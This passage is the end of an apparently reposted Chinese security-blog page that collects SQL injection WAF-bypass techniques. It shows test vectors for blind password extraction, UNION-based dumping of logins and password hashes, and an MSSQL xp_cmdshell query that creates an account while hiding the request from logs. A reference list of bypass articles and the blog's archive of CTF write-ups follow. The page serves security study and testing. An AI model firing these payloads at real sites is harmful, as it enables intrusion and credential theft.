class="string">&#x27;user&#x27;</span> OR mid(password,1,1) regexp <span class="string">&#x27;[*]&#x27;</span>select user from mysql.user <span class="built_in">where</span> user = <span class="string">&#x27;user&#x27;</span> OR mid(password,1,1) like <span class="string">&#x27;*&#x27;</span>select user from mysql.user <span class="built_in">where</span> user = <span class="string">&#x27;user&#x27;</span> OR mid(password,1,1) rlike <span class="string">&#x27;[*]&#x27;</span>select user from mysql.user <span class="built_in">where</span> user = <span class="string">&#x27;user&#x27;</span> OR ord(mid(password,1,1))=42</span><br><span class="line">/?id=1+union+(select<span class="string">&#x27;1&#x27;</span>,concat(login,<span class="built_in">hash</span>)from+users)/?id=(1)union(((((((select(1),hex(<span class="built_in">hash</span>)from(users)))))))) </span><br><span class="line">?id=1<span class="string">&#x27;; /*&amp;id=1*/ EXEC /*&amp;id=1*/ master..xp_cmdshell /*&amp;id=1*/ net user lucifer UrWaFisShiT /*&amp;id=1*/ --id=10 a%nd 1=0/(se%lect top 1 ta%ble_name fr%om info%rmation_schema.tables)id=10 and 1=0/(select top 1 table_name from information_schema.tables)</span></span><br><span class="line"><span class="string">id=-725+UNION+SELECT+1,GROUP_CONCAT(id,0x3a,login,0x3a,password,0x3a,email,0x3a,access_level),3,4,5+FROM+Admin--id=-725+UNION+SELECT+1,version(),3,4,5--sp_password  //使用sp_password隐藏log中的请求</span></span><br></pre></td></tr></table></figure>
+
+<h1 id="0x5-参考资料"><a href="#0x5-参考资料" class="headerlink" title="0x5 参考资料"></a>0x5 参考资料</h1><p>WAF介绍：<a target="_blank" rel="noopener" href="http://www.nsfocus.com/waf/jishu/js_01.html">http://www.nsfocus.com/waf/jishu/js_01.html</a></p>
+<p>WAF实现扫描器识别：<a target="_blank" rel="noopener" href="http://drops.wooyun.org/tips/730">http://drops.wooyun.org/tips/730</a>　</p>
+<p>WAF的绕过技巧：<a target="_blank" rel="noopener" href="http://drops.wooyun.org/tips/132">http://drops.wooyun.org/tips/132</a></p>
+<p>绕过waf的笔记：<a target="_blank" rel="noopener" href="http://fuck.0day5.com/?p=622">http://fuck.0day5.com/?p=622</a></p>
+<p>SQL注入中的WAF绕过技术：<a target="_blank" rel="noopener" href="http://netsecurity.51cto.com/art/201301/376869.htm">http://netsecurity.51cto.com/art/201301/376869.htm</a></p>
+<p>浅谈WAF的绕过：<a target="_blank" rel="noopener" href="http://netsecurity.51cto.com/art/201212/374068.htm">http://netsecurity.51cto.com/art/201212/374068.htm</a>　　</p>
+<p>SQL注入攻防入门详解(MS SQL)：<a target="_blank" rel="noopener" href="http://www.2cto.com/Article/201211/165466.html">http://www.2cto.com/Article/201211/165466.html</a>    </p>
+<p>Beyond SQLi: Obfuscate and Bypass ：<a target="_blank" rel="noopener" href="http://www.exploit-db.com/papers/17934/">http://www.exploit-db.com/papers/17934/</a></p>
+<p>从基础到高级的waf绕过方法：<a target="_blank" rel="noopener" href="http://gnahackteam.wordpress.com/2012/07/06/basic-to-advanced-waf-bypassing-methods/">http://gnahackteam.wordpress.com/2012/07/06/basic-to-advanced-waf-bypassing-methods/</a>　</p>
+<p>Bypass WAF：<a target="_blank" rel="noopener" href="http://www.surfthecyber.com/2013/05/how-to-bypass-waf-web-application.html">http://www.surfthecyber.com/2013/05/how-to-bypass-waf-web-application.html</a></p>
+<p>WAF Bypassing: SQL Injection (forbidden or not?)：<a target="_blank" rel="noopener" href="http://www.r00tsec.com/2011/07/sql-injection-bypass-waf.html">http://www.r00tsec.com/2011/07/sql-injection-bypass-waf.html</a></p>
+<p>WAF filter evasion：<a target="_blank" rel="noopener" href="http://sla.ckers.org/forum/read.php?24,33903">http://sla.ckers.org/forum/read.php?24,33903</a></p>
+<p><a target="_blank" rel="noopener" href="http://em3rgency.com/sql-injection-filter-evasion/">http://em3rgency.com/sql-injection-filter-evasion/</a></p>
+<p><a target="_blank" rel="noopener" href="http://0haxor.blogspot.com/2012/08/waf-waf-bypassing.html">http://0haxor.blogspot.com/2012/08/waf-waf-bypassing.html</a></p>
+<p><a target="_blank" rel="noopener" href="http://kaoticcreations.blogspot.com/p/sql-injection-waf-bypassing.html">http://kaoticcreations.blogspot.com/p/sql-injection-waf-bypassing.html</a></p>
+<p><a target="_blank" rel="noopener" href="http://kaoticcreations.blogspot.com/p/basic-sql-injection-101.html">http://kaoticcreations.blogspot.com/p/basic-sql-injection-101.html</a></p>
+<p><a target="_blank" rel="noopener" href="http://websec.files.wordpress.com/2010/11/sqli2.pdf">http://websec.files.wordpress.com/2010/11/sqli2.pdf</a></p>
+<p><a target="_blank" rel="noopener" href="http://websec.wordpress.com/2010/12/04/sqli-filter-evasion-cheat-sheet-mysql/">http://websec.wordpress.com/2010/12/04/sqli-filter-evasion-cheat-sheet-mysql/</a></p>
+<p>addtion:”Mysql注入科普”也不错 ：<a target="_blank" rel="noopener" href="http://drops.wooyun.org/tips/123">http://drops.wooyun.org/tips/123</a></p>
+
+    </article>
+    <!-- license  -->
+    
+    <!-- paginator  -->
+    <ul class="post-paginator">
+        <li class="next">
+            
+                <div class="nextSlogan">Next Post</div>
+                <a href= "/2020/08/12/%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B4%E6%99%BA%E8%83%BD%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B-Web-hate-php/" title= "取反异或绕过">
+                    <div class="nextTitle">取反异或绕过</div>
+                </a>
+            
+        </li>
+        <li class="previous">
+            
+                <div class="prevSlogan">Previous Post</div>
+                <a href= "/2020/08/08/JWT%E7%9A%84%E5%88%A9%E7%94%A8/" title= "JWT的利用">
+                    <div class="prevTitle">JWT的利用</div>
+                </a>
+            
+        </li>
+    </ul>
+    <!-- 评论插件 -->
+    <!-- 来必力City版安装代码 -->
+
+<!-- City版安装代码已完成 -->
+    
+    
+    <!-- gitalk评论 -->
+
+    <!-- utteranc评论 -->
+
+    <!-- partial('_partial/comment/changyan') -->
+    <!--PC版-->
+
+
+    
+    
+
+    <!-- 评论 -->
+</main>
+            <!-- profile -->
+            
+        </div>
+        <footer class="footer footer-unloaded">
+    <!-- social  -->
+    
+    <div class="social">
+        
+    
+        
+            
+                <a href="mailto:a785745707@gmail.com" class="iconfont-archer email" title=email ></a>
+            
+        
+    
+        
+            
+                <a href="https://github.com/HacKerQWQ" class="iconfont-archer github" target="_blank" title=github></a>
+            
+        
+    
+        
+            
+                <span class="iconfont-archer wechat" title=wechat>
+                  
+                  <img class="profile-qr" src="/assets/Misaka.jpg" />
+                </span>
+            
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+            
+                <a href="/atom.xml" class="iconfont-archer rss" target="_blank" title=rss></a>
+            
+        
+    
+
+    </div>
+    
+    <!-- powered by Hexo  -->
+    <div class="copyright">
+        <span id="hexo-power">Powered by <a href="https://hexo.io/" target="_blank">Hexo</a></span><span class="iconfont-archer power">&#xe635;</span><span id="theme-info">theme <a href="https://github.com/fi3ework/hexo-theme-archer" target="_blank">Archer</a></span>
+    </div>
+    <!-- 不蒜子  -->
+    
+    <div class="busuanzi-container">
+    
+     
+    <span id="busuanzi_container_site_pv">PV: <span id="busuanzi_value_site_pv"></span> :)</span>
+    
+    </div>
+    
+</footer>
+    </div>
+    <!-- toc -->
+    
+    <div class="toc-wrapper" style=
+    
+
+
+
+
+
+
+
+top:50vh;
+
+    >
+        <div class="toc-catalog">
+            <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
+        </div>
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#0x1-WAF%E7%9A%84%E5%B8%B8%E8%A7%81%E7%89%B9%E5%BE%81"><span class="toc-number">1.</span> <span class="toc-text">0x1 WAF的常见特征</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x2-%E7%BB%95%E8%BF%87WAF%E7%9A%84%E6%96%B9%E6%B3%95"><span class="toc-number">2.</span> <span class="toc-text">0x2 绕过WAF的方法</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#a-%E5%A4%A7%E5%B0%8F%E5%86%99%E7%BB%95%E8%BF%87"><span class="toc-number">2.1.</span> <span class="toc-text">a) 大小写绕过</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#b-%E6%9B%BF%E6%8D%A2%E5%85%B3%E9%94%AE%E5%AD%97"><span class="toc-number">2.2.</span> <span class="toc-text">b)替换关键字</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#c-%E4%BD%BF%E7%94%A8%E7%BC%96%E7%A0%81"><span class="toc-number">2.3.</span> <span class="toc-text">c)使用编码</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-URL%E7%BC%96%E7%A0%81"><span class="toc-number">2.3.1.</span> <span class="toc-text">1.URL编码</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E5%8D%81%E5%85%AD%E8%BF%9B%E5%88%B6%E7%BC%96%E7%A0%81"><span class="toc-number">2.3.2.</span> <span class="toc-text">2.十六进制编码</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-Unicode%E7%BC%96%E7%A0%81"><span class="toc-number">2.3.3.</span> <span class="toc-text">3.Unicode编码</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-%E7%A7%91%E5%AD%A6%E8%AE%A1%E6%95%B0%E6%B3%95%E7%BB%95%E8%BF%87"><span class="toc-number">2.3.4.</span> <span class="toc-text">4.科学计数法绕过</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#d-%E4%BD%BF%E7%94%A8%E6%B3%A8%E9%87%8A"><span class="toc-number">2.4.</span> <span class="toc-text">d) 使用注释</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E6%99%AE%E9%80%9A%E6%B3%A8%E9%87%8A"><span class="toc-number">2.4.1.</span> <span class="toc-text">1.普通注释</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E5%86%85%E8%81%94%E6%B3%A8%E9%87%8A"><span class="toc-number">2.4.2.</span> <span class="toc-text">2.内联注释</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#e-%E7%AD%89%E4%BB%B7%E5%87%BD%E6%95%B0%E4%B8%8E%E5%91%BD%E4%BB%A4"><span class="toc-number">2.5.</span> <span class="toc-text">e)等价函数与命令</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E5%87%BD%E6%95%B0%E6%88%96%E5%8F%98%E9%87%8F"><span class="toc-number">2.5.1.</span> <span class="toc-text">1.函数或变量</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E7%AC%A6%E5%8F%B7"><span class="toc-number">2.5.2.</span> <span class="toc-text">2.符号</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E7%94%9F%E5%83%BB%E5%87%BD%E6%95%B0"><span class="toc-number">2.5.3.</span> <span class="toc-text">3.生僻函数</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#f-%E7%89%B9%E6%AE%8A%E7%AC%A6%E5%8F%B7"><span class="toc-number">2.6.</span> <span class="toc-text">f) 特殊符号</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#g-%E8%AF%BB%E5%8F%96%E6%96%87%E4%BB%B6%E6%88%96%E8%80%85%E5%86%99shell"><span class="toc-number">2.7.</span> <span class="toc-text">g)读取文件或者写shell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#h-HTTP%E5%8F%82%E6%95%B0%E6%8E%A7%E5%88%B6"><span class="toc-number">2.8.</span> <span class="toc-text">h) HTTP参数控制</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#i-%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA-Advanced"><span class="toc-number">2.9.</span> <span class="toc-text">i) 缓冲区溢出(Advanced)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#j-%E6%95%B4%E5%90%88%E7%BB%95%E8%BF%87"><span class="toc-number">2.10.</span> <span class="toc-text">j) 整合绕过</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x3-SQLi-Filter%E7%9A%84%E5%AE%9E%E7%8E%B0%E5%8F%8AEvasion"><span class="toc-number">3.</span> <span class="toc-text">0x3 SQLi Filter的实现及Evasion</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x4-%E5%BB%B6%E4%BC%B8%E5%8F%8A%E6%B5%8B%E8%AF%95%E5%90%91%E9%87%8F%E7%A4%BA%E4%BE%8B"><span class="toc-number">4.</span> <span class="toc-text">0x4 延伸及测试向量示例</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#a-Web%E5%BA%94%E7%94%A8%E7%BB%95%E8%BF%87%E7%A4%BA%E4%BE%8B"><span class="toc-number">4.1.</span> <span class="toc-text">a) Web应用绕过示例</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#b-WAF%E7%BB%95%E8%BF%87%E7%A4%BA%E4%BE%8B"><span class="toc-number">4.2.</span> <span class="toc-text">b) WAF绕过示例</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#c-SQLi-Filter-Evasion-Cheat-sheet"><span class="toc-number">4.3.</span> <span class="toc-text">c) SQLi Filter Evasion Cheat sheet</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#d-%E6%B5%8B%E8%AF%95%E5%90%91%E9%87%8F"><span class="toc-number">4.4.</span> <span class="toc-text">d)测试向量</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x5-%E5%8F%82%E8%80%83%E8%B5%84%E6%96%99"><span class="toc-number">5.</span> <span class="toc-text">0x5 参考资料</span></a></li></ol>
+    </div>
+    
+    <div class="back-top iconfont-archer">&#xe639;</div>
+    <div class="sidebar sidebar-hide">
+    <ul class="sidebar-tabs sidebar-tabs-active-0">
+        <li class="sidebar-tab-archives"><span class="iconfont-archer">&#xe67d;</span><span class="tab-name">Archive</span></li>
+        <li class="sidebar-tab-tags"><span class="iconfont-archer">&#xe61b;</span><span class="tab-name">Tag</span></li>
+        <li class="sidebar-tab-categories"><span class="iconfont-archer">&#xe666;</span><span class="tab-name">Cate</span></li>
+    </ul>
+    <div class="sidebar-content sidebar-content-show-archive">
+          <div class="sidebar-panel-archives">
+    <!-- 在ejs中将archive按照时间排序 -->
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    <div class="total-and-search">
+        <div class="total-archive">
+        Total : 42
+        </div>
+        <!-- search  -->
+        
+    </div>
+    
+    <div class="post-archive">
+    
+    
+    
+    
+    <div class="archive-year"> 2020 </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">10/07</span><a class="archive-post-title" href= "/2020/10/07/hello-world/" >Hello World</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">09/26</span><a class="archive-post-title" href= "/2020/09/26/CRC32%E7%A2%B0%E6%92%9E%E6%81%A2%E5%A4%8Dpng/" >CRC32碰撞恢复png(含png块的知识)</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">09/10</span><a class="archive-post-title" href= "/2020/09/10/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-Reverse-it-xxd%E3%80%81tr%E3%80%81rev%E5%91%BD%E4%BB%A4/" >攻防世界-Reverse-it(xxd、tr、rev命令)</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">09/06</span><a class="archive-post-title" href= "/2020/09/06/%E7%A0%B4%E8%A7%A3zip%E5%AF%86%E7%A0%81%E5%91%BD%E4%BB%A4/" >破解zip密码命令</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">08/26</span><a class="archive-post-title" href= "/2020/08/26/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-stegnao-%E4%BA%8C%E7%BB%B4%E7%A0%81%E5%8E%9F%E7%90%86/" >攻防世界-stegnao-二维码原理</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">08/21</span><a class="archive-post-title" href= "/2020/08/21/2020%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B-%E5%88%9D%E8%B5%9B%E9%83%A8%E5%88%86writeup/" >2020全国大学生信息安全大赛-初赛部分writeup</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">08/19</span><a class="archive-post-title" href= "/2020/08/19/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-CAT-PHP-curl/" >宽字节注入+curl读取文件+Django框架漏洞的组合拳</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">08/19</span><a class="archive-post-title" href= "/2020/08/19/flask%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/" >flask模板注入(内含其他的ssti注入链接)</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">08/19</span><a class="archive-post-title" href= "/2020/08/19/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-Web_php_unserialize/" >__wakeup()的绕过和正则绕过</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">08/19</span><a class="archive-post-title" href= "/2020/08/19/%E7%BD%91%E9%BC%8E%E6%9D%AF-2018-Web-Unfinish/" >二次注入在实战的运用</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">08/18</span><a class="archive-post-title" href= "/2020/08/18/Jarvis-PHPINFO/" >php反序列化漏洞及upload_progress-sessions</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">08/16</span><a class="archive-post-title" href= "/2020/08/16/Jarvis-flag%E5%9C%A8%E7%AE%A1%E7%90%86%E5%91%98%E6%89%8B%E9%87%8C/" >Hash长度拓展攻击</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">08/15</span><a class="archive-post-title" href= "/2020/08/15/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%8F%8D%E5%BC%B9shell%E5%92%8C%E7%95%99%E5%90%8E%E9%97%A8/" >渗透测试之反弹shell和留后门</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">08/15</span><a class="archive-post-title" href= "/2020/08/15/%E8%BD%AC%E8%BD%BD-CSP%E6%80%BB%E7%BB%93%E5%8F%8ACTF%E5%AE%9E%E4%BE%8B%E5%88%86%E6%9E%90/" >[转载]CSP总结及CTF实例分析</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">08/14</span><a class="archive-post-title" href= "/2020/08/14/2019-%E5%BC%BA%E7%BD%91%E6%9D%AF-suersqli/" >堆叠注入、预定义sql语句的知识及例题</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">08/14</span><a class="archive-post-title" href= "/2020/08/14/BDJCTF-2020-writeup/" >md5碰撞脚本及shtml在BDJCTF的例题</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">08/14</span><a class="archive-post-title" href= "/2020/08/14/2020-%E7%BD%91%E9%BC%8E%E6%9D%AF-%E7%8E%84%E6%AD%A6%E7%BB%84-writeup/" >jwt在网鼎杯的运用</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">08/13</span><a class="archive-post-title" href= "/2020/08/13/HCTF-2018-Web-writeup/" >phpmyAdmin文件包含漏洞在2018-HCTF的例题</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">08/13</span><a class="archive-post-title" href= "/2020/08/13/2020-%E7%BD%91%E9%BC%8E%E6%9D%AF-%E9%9D%92%E9%BE%99%E7%BB%84-Web/" >2020-网鼎杯-青龙组-Web</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">08/12</span><a class="archive-post-title" href= "/2020/08/12/2020-%E7%BD%91%E9%BC%8E%E6%9D%AF-%E6%9C%B1%E9%9B%80%E7%BB%84-Web/" >动态调用函数以及nmap用法在网鼎杯的例题</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">08/12</span><a class="archive-post-title" href= "/2020/08/12/%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B4%E6%99%BA%E8%83%BD%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B-Web-hate-php/" >取反异或绕过</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">08/11</span><a class="archive-post-title" href= "/2020/08/11/%E8%BD%AC%E8%BD%BD-sql%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E5%A4%A7%E9%9B%86%E5%90%88/" >[转载]sql注入绕过大集合</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">08/08</span><a class="archive-post-title" href= "/2020/08/08/JWT%E7%9A%84%E5%88%A9%E7%94%A8/" >JWT的利用</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">08/07</span><a class="archive-post-title" href= "/2020/08/07/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E7%9F%A5%E8%AF%86%E7%82%B9%E6%95%B4%E7%90%86%EF%BC%88%E6%9B%B4%E6%96%B0-%EF%BC%89/" >命令注入知识点整理（更新..）</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">08/06</span><a class="archive-post-title" href= "/2020/08/06/SVN%E5%92%8CHG%E6%BA%90%E7%A0%81%E6%B3%84%E9%9C%B2/" >SVN和HG源码泄露</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">08/06</span><a class="archive-post-title" href= "/2020/08/06/git%E6%BA%90%E7%A0%81%E6%B3%84%E9%9C%B2payload/" >.git源码泄露payload</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">08/05</span><a class="archive-post-title" href= "/2020/08/05/VIM%E7%BC%96%E8%BE%91%E5%99%A8%E5%BC%82%E5%B8%B8%E9%80%80%E5%87%BA%E5%AF%BC%E8%87%B4%E7%9A%84%E6%BA%90%E7%A0%81%E6%B3%84%E9%9C%B2/" >VIM编辑器异常退出导致的源码泄露</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">08/05</span><a class="archive-post-title" href= "/2020/08/05/Jarvis-injeect-%E5%8F%8D%E5%BC%95%E5%8F%B7%E6%B3%A8%E5%85%A5/" >Jarvis injeect(反引号注入)</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">08/05</span><a class="archive-post-title" href= "/2020/08/05/XXE%E6%B3%A8%E5%85%A5payload/" >XXE注入payload</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">07/29</span><a class="archive-post-title" href= "/2020/07/29/%E6%90%AD%E5%BB%BAwordpress%E7%8E%AF%E5%A2%83-docker-%E6%B5%8B%E8%AF%95plugin%E6%BC%8F%E6%B4%9E/" >搭建wordpress环境(docker)测试plugin漏洞</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">07/23</span><a class="archive-post-title" href= "/2020/07/23/metasploit%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%AD%A6%E4%B9%A0/" >metasploit之信息收集学习</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">07/22</span><a class="archive-post-title" href= "/2020/07/22/%E8%BD%AC%E8%BD%BD-%E6%B8%97%E9%80%8F%E5%9F%BA%E7%A1%80-%E5%B8%B8%E7%94%A8Windows%E5%91%BD%E4%BB%A4%E5%A4%A7%E5%85%A8/" >[转载]渗透基础-常用Windows命令大全</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">07/19</span><a class="archive-post-title" href= "/2020/07/19/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%B7%A5%E5%85%B7-%E7%BD%91%E7%AB%99%E6%95%B4%E7%90%86/" >信息收集工具/网站整理</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">07/13</span><a class="archive-post-title" href= "/2020/07/13/metasploit%E4%B9%8B%E5%88%9D%E8%AF%86metasploit/" >metasploit魔鬼训练营之初识metasploit</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">07/01</span><a class="archive-post-title" href= "/2020/07/01/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0/" >PHP代码审计学习</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">06/11</span><a class="archive-post-title" href= "/2020/06/11/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E7%9F%A5%E8%AF%86%E7%82%B9%E6%95%B4%E7%90%86/" >文件上传漏洞知识点整理</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">06/10</span><a class="archive-post-title" href= "/2020/06/10/MD5-collision/" >MD5-collision</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">04/27</span><a class="archive-post-title" href= "/2020/04/27/%E4%BB%8Ectf%E9%A2%98%E7%9B%AE-%E7%AD%94%E6%A1%88%E5%B0%B1%E5%9C%A8index-php-%E7%9C%8BPHP%E4%BC%AA%E9%80%A0%E5%8D%8F%E8%AE%AE/" >从ctf题目(答案就在index.php)看PHP伪造协议</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">04/24</span><a class="archive-post-title" href= "/2020/04/24/http%E5%90%84%E5%A4%B4%E9%83%A8%E5%AD%97%E6%AE%B5%E7%9A%84%E5%90%AB%E4%B9%89%EF%BC%88%E8%BD%AC%E8%BD%BD%EF%BC%89/" >http各头部字段的含义（转载）</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
